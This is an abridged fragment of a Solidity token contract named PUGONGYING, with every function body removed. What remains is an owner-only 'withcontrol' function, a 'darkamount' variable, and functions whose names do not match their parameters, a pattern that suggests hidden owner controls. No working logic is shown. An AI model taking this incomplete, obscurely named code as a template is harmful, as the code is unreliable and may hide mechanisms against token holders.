...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function withcontrol(address newOwner) external onlyOwner returns (bool) {
...
contract PUGONGYING is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "PUGONGYING";    
    string public symbol = "PUGO";
    uint8 public decimals = 9;   

    uint8 public darkamount;
    ...
    function makereference(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
    ...
    function cutoldowner(uint256 _rTotal, uint256 _tTotal) private pure returns(uint256, uint256) {
    ...
    function makeprocess(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
    {
